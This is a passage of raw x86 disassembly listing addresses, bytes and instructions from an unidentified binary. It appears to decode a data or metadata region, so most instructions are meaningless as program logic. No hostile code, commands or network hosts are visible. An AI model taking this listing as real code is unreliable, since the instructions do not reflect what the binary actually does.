  407067:	19 4e 05             	sbb    %ecx,0x5(%esi)
  40706a:	11 03                	adc    %eax,(%ebx)
  40706c:	e9 14 54 05 19       	jmp    0x1945c485
  407071:	03 f6                	add    %esi,%esi
  407073:	1a 5a 05             	sbb    0x5(%edx),%bl
  407076:	21 03                	and    %eax,(%ebx)
  407078:	d1 0f                	rorl   $1,(%edi)
  40707a:	60                   	pusha
  40707b:	05 c1 01 06 1a       	add    $0x1a0601c1,%eax
  407080:	47                   	inc    %edi
  407081:	02 19                	add    (%ecx),%bl
  407083:	03 e2                	add    %edx,%esp
  407085:	1b bf 01 81 02 c8    	sbb    -0x37fd7eff(%edi),%edi
  40708b:	05 6a 05 29 03       	add    $0x329056a,%eax
  407090:	6e                   	outsb  %ds:(%esi),(%dx)
  407091:	00 f4                	add    %dh,%ah
  407093:	01 59 01             	add    %ebx,0x1(%ecx)
  407096:	57                   	push   %edi
  407097:	1b 7b 00             	sbb    0x0(%ebx),%edi
  40709a:	59                   	pop    %ecx
  40709b:	01 75 07             	add    %esi,0x7(%ebp)
  40709e:	c3                   	ret
  40709f:	00 59 01             	add    %bl,0x1(%ecx)
  4070a2:	37                   	aaa
  4070a3:	07                   	pop    %es
  4070a4:	c3                   	ret
  4070a5:	00 59 01             	add    %bl,0x1(%ecx)
  4070a8:	00 11                	add    %dl,(%ecx)
  4070aa:	77 05                	ja     0x4070b1
  4070ac:	c1 01 bd             	roll   $0xbd,(%ecx)
  4070af:	18 7d 05             	sbb    %bh,0x5(%ebp)
  4070b2:	49                   	dec    %ecx
  4070b3:	03 01                	add    (%ecx),%eax
  4070b5:	15 0e 00 61 01       	adc    $0x161000e,%eax
  4070ba:	52                   	push   %edx
  4070bb:	02 b1 03 51 03 19    	add    0x19035103(%ecx),%dh
  4070c1:	0d 75 01 69 00       	or     $0x690175,%eax
  4070c6:	01 15 0e 00 21 02    	add    %edx,0x221000e
  4070cc:	66 0c 70             	data16 or $0x70,%al
  4070cf:	01 69 00             	add    %ebp,0x0(%ecx)
  4070d2:	c9                   	leave
  4070d3:	04 8e                	add    $0x8e,%al
  4070d5:	05 c1 01 ca 0c       	add    $0xcca01c1,%eax
  4070da:	94                   	xchg   %eax,%esp
  4070db:	05 c1 01 43 14       	add    $0x144301c1,%eax
  4070e0:	47                   	inc    %edi
  4070e1:	02 c1                	add    %cl,%al
  4070e3:	01 e2                	add    %esp,%edx
  4070e5:	04 a1                	add    $0xa1,%al
  4070e7:	05 59 01 da 0f       	add    $0xfda0159,%eax
  4070ec:	1d 00 61 03 66       	sbb    $0x66036100,%eax
  4070f1:	0c 47                	or     $0x47,%al
  4070f3:	02 69 03             	add    0x3(%ecx),%ch
  4070f6:	48                   	dec    %eax
  4070f7:	0d c3 00 b1 02       	or     $0x2b100c3,%eax
  4070fc:	b0 07                	mov    $0x7,%al
  4070fe:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4070ff:	05 59 03 c2 07       	add    $0x7c20359,%eax
  407104:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407105:	05 59 03 66 0c       	add    $0xc660359,%eax
  40710a:	47                   	inc    %edi
  40710b:	02 71 03             	add    0x3(%ecx),%dh
  40710e:	02 1b                	add    (%ebx),%bl
  407110:	ad                   	lods   %ds:(%esi),%eax
  407111:	05 79 03 01 15       	add    $0x15010379,%eax
  407116:	b3 05                	mov    $0x5,%bl
  407118:	79 03                	jns    0x40711d
  40711a:	71 06                	jno    0x407122
  40711c:	ba 05 c1 00 5e       	mov    $0x5e00c105,%edx
  407121:	08 0e                	or     %cl,(%esi)
  407123:	00 19                	add    %bl,(%ecx)
  407125:	00 5e 08             	add    %bl,0x8(%esi)
  407128:	0e                   	push   %cs
  407129:	00 09                	add    %cl,(%ecx)
  40712b:	03 01                	add    (%ecx),%eax
  40712d:	15 36 02 0c 00       	adc    $0xc0236,%eax
  407132:	01 15 0e 00 0c 00    	add    %edx,0xc000e
  407138:	22 03                	and    (%ebx),%al
  40713a:	d9 05 0c 00 4d 1b    	flds   0x1b4d000c
  407140:	f4                   	hlt
  407141:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  407144:	7e 1c                	jle    0x407162
  407146:	df 05 c1 01 df 10    	filds  0x10df01c1
  40714c:	e5 05                	in     $0x5,%eax
  40714e:	51                   	push   %ecx
  40714f:	00 ee                	add    %ch,%dh
  407151:	17                   	pop    %ss
  407152:	f5                   	cmc
  407153:	05 51 00 f4 01       	add    $0x1f40051,%eax
  407158:	fb                   	sti
  407159:	05 59 00 6b 03       	add    $0x36b0059,%eax
  40715e:	fb                   	sti
  40715f:	05 89 03 77 1d       	add    $0x1d770389,%eax
  407164:	01 06                	add    %eax,(%esi)
  407166:	69 00 01 15 01 03    	imul   $0x3011501,(%eax),%eax
  40716c:	61                   	popa
  40716d:	00 01                	add    %al,(%ecx)
  40716f:	15 11 06 91 03       	adc    $0x3910611,%eax
  407174:	5e                   	pop    %esi
  407175:	08 0e                	or     %cl,(%esi)
  407177:	00 99 03 01 15 3a    	add    %bl,0x3a150103(%ecx)
  40717d:	04 a1                	add    $0xa1,%al
  40717f:	03 b5 0b 19 06 81    	add    -0x7ef9e6f5(%ebp),%esi
  407185:	02 17                	add    (%edi),%dl
  407187:	05 0a 00 91 02       	add    $0x291000a,%eax
  40718c:	ad                   	lods   %ds:(%esi),%eax
  40718d:	1c 19                	sbb    $0x19,%al
  40718f:	05 91 02 b8 0a       	add    $0xab80291,%eax
  407194:	27                   	daa
  407195:	06                   	push   %es
  407196:	89 01                	mov    %eax,(%ecx)
  407198:	79 05                	jns    0x40719f
  40719a:	47                   	inc    %edi
  40719b:	02 91 02 ad 1c 38    	add    0x381cad02(%ecx),%dl
  4071a1:	06                   	push   %es
  4071a2:	91                   	xchg   %eax,%ecx
  4071a3:	02 af 0a 60 05 91    	add    -0x6efa9ff6(%edi),%ch
  4071a9:	02 98 0a 6b 01 91    	add    -0x6efe94f6(%eax),%bl
  4071af:	02 c7                	add    %bh,%al
  4071b1:	1c 42                	sbb    $0x42,%al
  4071b3:	06                   	push   %es
  4071b4:	91                   	xchg   %eax,%ecx
  4071b5:	02 68 05             	add    0x5(%eax),%ch
  4071b8:	6b 01 1c             	imul   $0x1c,(%ecx),%eax
  4071bb:	00 22                	add    %ah,(%edx)
  4071bd:	03 d9                	add    %ecx,%ebx
  4071bf:	05 b9 03 b6 1b       	add    $0x1bb603b9,%eax
  4071c4:	60                   	pusha
  4071c5:	06                   	push   %es
  4071c6:	1c 00                	sbb    $0x0,%al
  4071c8:	e9 14 76 06 24       	jmp    0x2446e7e1
  4071cd:	00 f6                	add    %dh,%dh
  4071cf:	1a 88 06 1c 00 e3    	sbb    -0x1cffe3fa(%eax),%cl
  4071d5:	0a 8d 06 24 00 e2    	or     -0x1dffdbfa(%ebp),%cl
  4071db:	1b bf 01 c9 03 bc    	sbb    -0x43fc36ff(%edi),%edi
  4071e1:	10 97 06 c9 03 18    	adc    %dl,0x1803c906(%edi)
  4071e7:	03 9d 06 d1 03 25    	add    0x2503d106(%ebp),%ebx
  4071ed:	08 a5 06 e1 03 ea    	or     %ah,-0x15fc1efa(%ebp)
  4071f3:	04 ac                	add    $0xac,%al
  4071f5:	06                   	push   %es
  4071f6:	d9 03                	flds   (%ebx)
  4071f8:	08 06                	or     %al,(%esi)
  4071fa:	b3 06                	mov    $0x6,%bl
  4071fc:	f1                   	int1
  4071fd:	03 b3 08 bc 06 01    	add    0x106bc08(%ebx),%esi
  407203:	04 d1                	add    $0xd1,%al
  407205:	12 c6                	adc    %dh,%al
  407207:	06                   	push   %es
  407208:	2c 00                	sub    $0x0,%al
  40720a:	b3 08                	mov    $0x8,%bl
  40720c:	fb                   	sti
  40720d:	06                   	push   %es
  40720e:	2c 00                	sub    $0x0,%al
  407210:	6d                   	insl   (%dx),%es:(%edi)
  407211:	19 07                	sbb    %eax,(%edi)
  407213:	07                   	pop    %es
  407214:	34 00                	xor    $0x0,%al
  407216:	95                   	xchg   %eax,%ebp
  407217:	05 1f 07 1c 00       	add    $0x1c071f,%eax
  40721c:	01 15 0e 00 c1 01    	add    %edx,0x1c1000e
  407222:	b5 1d                	mov    $0x1d,%ch
  407224:	84 00                	test   %al,(%eax)
  407226:	21 04 01             	and    %eax,(%ecx,%eax,1)
  407229:	15 6b 01 19 04       	adc    $0x419016b,%eax
  40722e:	01 15 3d 07 29 04    	add    %edx,0x429073d
  407234:	b5 16                	mov    $0x16,%ch
  407236:	45                   	inc    %ebp
  407237:	07                   	pop    %es
  407238:	51                   	push   %ecx
  407239:	01 31                	add    %esi,(%ecx)
  40723b:	0c 93                	or     $0x93,%al
  40723d:	01 49 04             	add    %ecx,0x4(%ecx)
  407240:	01 15 6b 01 59 02    	add    %edx,0x259016b
  407246:	01 15 0e 00 31 04    	add    %edx,0x431000e
  40724c:	01 15 0e 00 51 04    	add    %edx,0x451000e
  407252:	5d                   	pop    %ebp
  407253:	0b 01                	or     (%ecx),%eax
  407255:	03 51 04             	add    0x4(%ecx),%edx
  407258:	fa                   	cli
  407259:	0a 01                	or     (%ecx),%al
  40725b:	03 51 04             	add    0x4(%ecx),%edx
  40725e:	f9                   	stc
  40725f:	04 5e                	add    $0x5e,%al
  407261:	07                   	pop    %es
  407262:	51                   	push   %ecx
  407263:	04 a9                	add    $0xa9,%al
  407265:	0b 65 07             	or     0x7(%ebp),%esp
  407268:	51                   	push   %ecx
  407269:	04 a5                	add    $0xa5,%al
  40726b:	1c 2b                	sbb    $0x2b,%al
  40726d:	02 51 04             	add    0x4(%ecx),%dl
  407270:	8c 02                	mov    %es,(%edx)
  407272:	0e                   	push   %cs
  407273:	00 51 04             	add    %dl,0x4(%ecx)
  407276:	26 15 6c 07 39 04    	es adc $0x439076c,%eax
  40727c:	01 15 72 07 51 04    	add    %edx,0x4510772
  407282:	7e 02                	jle    0x407286
  407284:	31 02                	xor    %eax,(%edx)
  407286:	39 04 4c             	cmp    %eax,(%esp,%ecx,2)
  407289:	0e                   	push   %cs
  40728a:	0e                   	push   %cs
  40728b:	00 41 04             	add    %al,0x4(%ecx)
  40728e:	01 15 2b 02 59 02    	add    %edx,0x259022b
  407294:	7e 1c                	jle    0x4072b2
  407296:	31 02                	xor    %eax,(%edx)
  407298:	51                   	push   %ecx
  407299:	03 19                	add    (%ecx),%ebx
  40729b:	0d 7e 07 79 04       	or     $0x479077e,%eax
  4072a0:	01 15 6b 01 51 04    	add    %edx,0x451016b
  4072a6:	85 02                	test   %eax,(%edx)
  4072a8:	2b 02                	sub    (%edx),%eax
  4072aa:	51                   	push   %ecx
  4072ab:	04 16                	add    $0x16,%al
  4072ad:	15 6c 07 c1 00       	adc    $0xc1076c,%eax
  4072b2:	7d 0d                	jge    0x4072c1
  4072b4:	23 02                	and    (%edx),%eax
  4072b6:	81 04 38 1d a2 07 91 	addl   $0x9107a21d,(%eax,%edi,1)
  4072bd:	04 61                	add    $0x61,%al
  4072bf:	1c b4                	sbb    $0xb4,%al
  4072c1:	07                   	pop    %es
  4072c2:	a1 04 01 15 0e       	mov    0xe150104,%eax
  4072c7:	00 c1                	add    %al,%cl
  4072c9:	01 c9                	add    %ecx,%ecx
  4072cb:	18 dd                	sbb    %bl,%ch
  4072cd:	07                   	pop    %es
  4072ce:	49                   	dec    %ecx
  4072cf:	02 b5 16 99 01 49    	add    0x49019916(%ebp),%dh
  4072d5:	02 b5 16 ab 01 a9    	add    -0x56fe54ea(%ebp),%dh
  4072db:	00 01                	add    %al,(%ecx)
  4072dd:	15 0e 00 1c 00       	adc    $0x1c000e,%eax
  4072e2:	d1 0f                	rorl   $1,(%edi)
  4072e4:	ea 07 1c 00 4d 1b f4 	ljmp   $0xf41b,$0x4d001c07
  4072eb:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4072ee:	c6                   	(bad)
  4072ef:	12 0e                	adc    (%esi),%cl
  4072f1:	00 c1                	add    %al,%cl
  4072f3:	01 72 17             	add    %esi,0x17(%edx)
  4072f6:	42                   	inc    %edx
  4072f7:	02 c1                	add    %cl,%al
  4072f9:	00 8e 0a 0c 08 49    	add    %cl,0x49080c0a(%esi)
  4072ff:	02 b5 16 a5 01 51    	add    0x5101a516(%ebp),%dh
  407305:	01 ad 00 16 08 c1    	add    %ebp,-0x3ef7ea00(%ebp)
  40730b:	01 3b                	add    %edi,(%ebx)
  40730d:	10 47 02             	adc    %al,0x2(%edi)
  407310:	a9 04 6c 08 1b       	test   $0x1b086c04,%eax
  407315:	08 51 01             	or     %dl,0x1(%ecx)
  407318:	ad                   	lods   %ds:(%esi),%eax
  407319:	00 20                	add    %ah,(%eax)
  40731b:	08 51 01             	or     %dl,0x1(%ecx)
  40731e:	ad                   	lods   %ds:(%esi),%eax
  40731f:	00 25 08 51 01 ad    	add    %ah,0xad015108
  407325:	00 2a                	add    %ch,(%edx)
  407327:	08 51 01             	or     %dl,0x1(%ecx)
  40732a:	ce                   	into
  40732b:	00 31                	add    %dh,(%ecx)
  40732d:	08 41 03             	or     %al,0x3(%ecx)
  407330:	6c                   	insb   (%dx),%es:(%edi)
  407331:	08 36                	or     %dh,(%esi)
  407333:	08 51 01             	or     %dl,0x1(%ecx)
  407336:	ce                   	into
  407337:	00 3b                	add    %bh,(%ebx)
  407339:	08 51 01             	or     %dl,0x1(%ecx)
  40733c:	ce                   	into
  40733d:	00 40 08             	add    %al,0x8(%eax)
  407340:	51                   	push   %ecx
  407341:	01 ce                	add    %ecx,%esi
  407343:	00 45 08             	add    %al,0x8(%ebp)
  407346:	51                   	push   %ecx
  407347:	01 b4 05 4c 08 b1 04 	add    %esi,0x4b1084c(%ebp,%eax,1)
  40734e:	6c                   	insb   (%dx),%es:(%edi)
  40734f:	08 51 08             	or     %dl,0x8(%ecx)
  407352:	49                   	dec    %ecx
  407353:	02 b5 16 5e 08 59    	add    0x59085e16(%ebp),%dh
  407359:	03 4e 1d             	add    0x1d(%esi),%ecx
  40735c:	23 02                	and    (%edx),%eax
  40735e:	e1 02                	loope  0x407362
  407360:	01 15 6c 08 c1 00    	add    %edx,0xc1086c
  407366:	85 0a                	test   %ecx,(%edx)
  407368:	f4                   	hlt
  407369:	01 89 01 01 15 6b    	add    %ecx,0x6b150101(%ecx)
  40736f:	01 49 02             	add    %ecx,0x2(%ecx)
  407372:	e0 00                	loopne 0x407374
  407374:	9a 08 49 02 31 06 a1 	lcall  $0xa106,$0x31024908
  40737b:	08 49 02             	or     %cl,0x2(%ecx)
  40737e:	b4 05                	mov    $0x5,%ah
  407380:	a8 08                	test   $0x8,%al
  407382:	49                   	dec    %ecx
  407383:	02 65 00             	add    0x0(%ebp),%ah
  407386:	af                   	scas   %es:(%edi),%eax
  407387:	08 49 02             	or     %cl,0x2(%ecx)
  40738a:	ad                   	lods   %ds:(%esi),%eax
  40738b:	00 b6 08 49 02 e9    	add    %dh,-0x16fdb6f8(%esi)
  407391:	00 bd 08 49 02 ce    	add    %bh,-0x31fdb6f8(%ebp)
  407397:	00 c4                	add    %al,%ah
  407399:	08 49 02             	or     %cl,0x2(%ecx)
  40739c:	b5 16                	mov    $0x16,%ch
  40739e:	f6 08 d1             	testb  $0xd1,(%eax)
  4073a1:	04 01                	add    $0x1,%al
  4073a3:	15 0c 09 09 00       	adc    $0x9090c,%eax
  4073a8:	80 00 0d             	addb   $0xd,(%eax)
  4073ab:	01 09                	add    %ecx,(%ecx)
  4073ad:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073b4:	88 00                	mov    %al,(%eax)
  4073b6:	17                   	pop    %ss
  4073b7:	01 08                	add    %ecx,(%eax)
  4073b9:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073bf:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073c6:	a0 00 66 01 08       	mov    0x8016600,%al
  4073cb:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073d2:	ec                   	in     (%dx),%al
  4073d3:	00 7f 02             	add    %bh,0x2(%edi)
  4073d6:	08 00                	or     %al,(%eax)
  4073d8:	f0 00 17             	lock add %dl,(%edi)
  4073db:	01 08                	add    %ecx,(%eax)
  4073dd:	00 f4                	add    %dh,%ah
  4073df:	00 12                	add    %dl,(%edx)
  4073e1:	01 08                	add    %ecx,(%eax)
  4073e3:	00 f8                	add    %bh,%al
  4073e5:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073ec:	89 02                	mov    %eax,(%edx)
  4073ee:	08 00                	or     %al,(%eax)
  4073f0:	00 01                	add    %al,(%ecx)
  4073f2:	8e 02                	mov    (%edx),%es
  4073f4:	08 00                	or     %al,(%eax)
  4073f6:	04 01                	add    $0x1,%al
  4073f8:	93                   	xchg   %eax,%ebx
  4073f9:	02 08                	add    (%eax),%cl
  4073fb:	00 08                	add    %cl,(%eax)
  4073fd:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  407403:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407409:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  40740f:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  407415:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  40741c:	06                   	push   %es
  40741d:	03 2e                	add    (%esi),%ebp
  40741f:	00 33                	add    %dh,(%ebx)
  407421:	00 0f                	add    %cl,(%edi)
  407423:	03 2e                	add    (%esi),%ebp
  407425:	00 3b                	add    %bh,(%ebx)
  407427:	00 34 03             	add    %dh,(%ebx,%eax,1)
  40742a:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40742e:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  407433:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407439:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  40743f:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  407445:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  40744b:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407451:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  407457:	00 43 03             	add    %al,0x3(%ebx)
  40745a:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407461:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  407467:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  40746d:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  407473:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407479:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  40747f:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  407485:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  40748b:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407491:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  407497:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  40749d:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074a3:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074a9:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074af:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074b5:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074bb:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c1:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074c7:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074cd:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074d3:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074d9:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074df:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074e5:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074eb:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f1:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074f7:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  4074fd:	02 9b 00 9a 03 00    	add    0x39a00(%ebx),%bl
  407503:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407509:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  40750f:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  407515:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  40751b:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407521:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  407527:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  40752d:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  407533:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407539:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  40753f:	00 20                	add    %ah,(%eax)
  407541:	00 00                	add    %al,(%eax)
  407543:	00 14 00             	add    %dl,(%eax,%eax,1)
  407546:	01 00                	add    %eax,(%eax)
  407548:	06                   	push   %es
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 1e                	add    %bl,(%esi)
  40754d:	00 a4 03 ad 03 d8 03 	add    %ah,0x3d803ad(%ebx,%eax,1)
  407554:	80 04 a6 04          	addb   $0x4,(%esi,%eiz,4)
  407558:	ca 04 38             	lret   $0x3804
  40755b:	05 3d 05 65 05       	add    $0x565053d,%eax
  407560:	6e                   	outsb  %ds:(%esi),(%dx)
  407561:	05 73 05 83 05       	add    $0x5830573,%eax
  407566:	9a 05 c1 05 ec 05 0b 	lcall  $0xb05,$0xec05c105
  40756d:	06                   	push   %es
  40756e:	20 06                	and    %al,(%esi)
  407570:	30 06                	xor    %al,(%esi)
  407572:	4a                   	dec    %edx
  407573:	06                   	push   %es
  407574:	93                   	xchg   %eax,%ebx
  407575:	06                   	push   %es
  407576:	37                   	aaa
  407577:	07                   	pop    %es
  407578:	4b                   	dec    %ebx
  407579:	07                   	pop    %es
  40757a:	87 07                	xchg   %eax,(%edi)
  40757c:	af                   	scas   %es:(%edi),%eax
  40757d:	07                   	pop    %es
  40757e:	be 07 cc 07 d4       	mov    $0xd407cc07,%esi
  407583:	07                   	pop    %es
  407584:	e3 07                	jecxz  0x40758d
  407586:	f0 07                	lock pop %es
  407588:	f5                   	cmc
  407589:	07                   	pop    %es
  40758a:	04 08                	add    $0x8,%al
  40758c:	11 08                	adc    %ecx,(%eax)
  40758e:	56                   	push   %esi
  40758f:	08 64 08 7a          	or     %ah,0x7a(%eax,%ecx,1)
  407593:	08 86 08 8c 08 92    	or     %al,-0x6df773f8(%esi)
  407599:	08 cb                	or     %cl,%bl
  40759b:	08 d5                	or     %dl,%ch
  40759d:	08 db                	or     %bl,%bl
  40759f:	08 e0                	or     %ah,%al
  4075a1:	08 e6                	or     %ah,%dh
  4075a3:	08 ef                	or     %ch,%bh
  4075a5:	08 fc                	or     %bh,%ah
  4075a7:	08 15 09 04 00 01    	or     %dl,0x1000409
  4075ad:	00 16                	add    %dl,(%esi)
  4075af:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075b2:	17                   	pop    %ss
  4075b3:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075b9:	00 00                	add    %al,(%eax)
  4075bb:	00 6c 1a 9f          	add    %ch,-0x61(%edx,%ebx,1)
  4075bf:	00 00                	add    %al,(%eax)
  4075c1:	00 50 1a             	add    %dl,0x1a(%eax)
  4075c4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4075c5:	00 00                	add    %al,(%eax)
  4075c7:	00 9d 13 a9 00 00    	add    %bl,0xa913(%ebp)
  4075cd:	00 29                	add    %ch,(%ecx)
  4075cf:	0b ae 00 00 00 da    	or     -0x26000000(%esi),%ebp
  4075d5:	19 ae 00 00 00 d9    	sbb    %ebp,-0x27000000(%esi)
  4075db:	0a b2 00 00 00 56    	or     0x56000000(%edx),%dh
  4075e1:	03 b7 00 00 00 f6    	add    -0xa000000(%edi),%esi
  4075e7:	02 bb 00 00 00 93    	add    -0x6d000000(%ebx),%bh
  4075ed:	0b b2 00 00 00 fd    	or     -0x3000000(%edx),%esi
  4075f3:	0e                   	push   %cs
  4075f4:	bf 00 00 00 f8       	mov    $0xf8000000,%edi
  4075f9:	0c b7                	or     $0xb7,%al
  4075fb:	00 00                	add    %al,(%eax)
  4075fd:	00 b0 1a c3 01 00    	add    %dh,0x1c31a(%eax)
  407603:	00 d5                	add    %dl,%ch
  407605:	0f f8 01             	psubb  (%ecx),%mm0
  407608:	00 00                	add    %al,(%eax)
  40760a:	98                   	cwtl
  40760b:	0d fe 01 00 00       	or     $0x1fe,%eax
  407610:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  407611:	0c 69                	or     $0x69,%al
  407613:	02 00                	add    (%eax),%al
  407615:	00 dd                	add    %bl,%ch
  407617:	13 6d 02             	adc    0x2(%ebp),%ebp
  40761a:	00 00                	add    %al,(%eax)
  40761c:	08 19                	or     %bl,(%ecx)
  40761e:	71 02                	jno    0x407622
  407620:	00 00                	add    %al,(%eax)
  407622:	95                   	xchg   %eax,%ebp
  407623:	1c 75                	sbb    $0x75,%al
  407625:	02 00                	add    (%eax),%al
  407627:	00 f8                	add    %bh,%al
  407629:	07                   	pop    %es
  40762a:	7a 02                	jp     0x40762e
  40762c:	02 00                	add    (%eax),%al
  40762e:	06                   	push   %es
  40762f:	00 03                	add    %al,(%ebx)
  407631:	00 01                	add    %al,(%ecx)
  407633:	00 07                	add    %al,(%edi)
  407635:	00 03                	add    %al,(%ebx)
  407637:	00 02                	add    %al,(%edx)
  407639:	00 08                	add    %cl,(%eax)
  40763b:	00 05 00 01 00 09    	add    %al,0x9000100
  407641:	00 05 00 02 00 0a    	add    %al,0xa000200
  407647:	00 07                	add    %al,(%edi)
  407649:	00 01                	add    %al,(%ecx)
  40764b:	00 0b                	add    %cl,(%ebx)
  40764d:	00 07                	add    %al,(%edi)
  40764f:	00 02                	add    %al,(%edx)
  407651:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407654:	09 00                	or     %eax,(%eax)
  407656:	01 00                	add    %eax,(%eax)
  407658:	0d 00 09 00 02       	or     $0x2000900,%eax
  40765d:	00 0e                	add    %cl,(%esi)
  40765f:	00 0b                	add    %cl,(%ebx)
  407661:	00 01                	add    %al,(%ecx)
  407663:	00 0f                	add    %cl,(%edi)
  407665:	00 0b                	add    %cl,(%ebx)
  407667:	00 02                	add    %al,(%edx)
  407669:	00 10                	add    %dl,(%eax)
  40766b:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407671:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407677:	00 0f                	add    %cl,(%edi)
  407679:	00 01                	add    %al,(%ecx)
  40767b:	00 13                	add    %dl,(%ebx)
  40767d:	00 0f                	add    %cl,(%edi)
  40767f:	00 02                	add    %al,(%edx)
  407681:	00 14 00             	add    %dl,(%eax,%eax,1)
  407684:	11 00                	adc    %eax,(%eax)
  407686:	02 00                	add    (%eax),%al
  407688:	15 00 13 00 01       	adc    $0x1001300,%eax
  40768d:	00 16                	add    %dl,(%esi)
  40768f:	00 13                	add    %dl,(%ebx)
  407691:	00 02                	add    %al,(%edx)
  407693:	00 17                	add    %dl,(%edi)
  407695:	00 15 00 01 00 18    	add    %dl,0x18000100
  40769b:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a1:	00 17                	add    %dl,(%edi)
  4076a3:	00 01                	add    %al,(%ecx)
  4076a5:	00 1a                	add    %bl,(%edx)
  4076a7:	00 17                	add    %dl,(%edi)
  4076a9:	00 02                	add    %al,(%edx)
  4076ab:	00 60 00             	add    %ah,0x0(%eax)
  4076ae:	19 00                	sbb    %eax,(%eax)
  4076b0:	02 00                	add    (%eax),%al
  4076b2:	68 00 1b 00 02       	push   $0x2001b00
  4076b7:	00 69 00             	add    %ch,0x0(%ecx)
  4076ba:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076bf:	00 1f                	add    %bl,(%edi)
  4076c1:	00 01                	add    %al,(%ecx)
  4076c3:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076ca:	8d 00                	lea    (%eax),%eax
  4076cc:	21 00                	and    %eax,(%eax)
  4076ce:	01 00                	add    %eax,(%eax)
  4076d0:	8e 00                	mov    (%eax),%es
  4076d2:	21 00                	and    %eax,(%eax)
  4076d4:	02 00                	add    (%eax),%al
  4076d6:	8f 00                	pop    (%eax)
  4076d8:	23 00                	and    (%eax),%eax
  4076da:	01 00                	add    %eax,(%eax)
  4076dc:	90                   	nop
  4076dd:	00 23                	add    %ah,(%ebx)
  4076df:	00 02                	add    %al,(%edx)
  4076e1:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076e7:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076ed:	00 c0                	add    %al,%al
  4076ef:	00 03                	add    %al,(%ebx)
  4076f1:	00 16                	add    %dl,(%esi)
  4076f3:	00 c2                	add    %al,%dl
  4076f5:	00 05 00 16 00 c4    	add    %al,0xc4001600
  4076fb:	00 07                	add    %al,(%edi)
  4076fd:	00 18                	add    %bl,(%eax)
  4076ff:	00 26                	add    %ah,(%esi)
  407701:	01 09                	add    %ecx,(%ecx)
  407703:	00 22                	add    %ah,(%edx)
  407705:	0f 15 0f             	unpckhps (%edi),%xmm1
  407708:	2d 0f d3 05 3f       	sub    $0x3f05d30f,%eax
  40770d:	06                   	push   %es
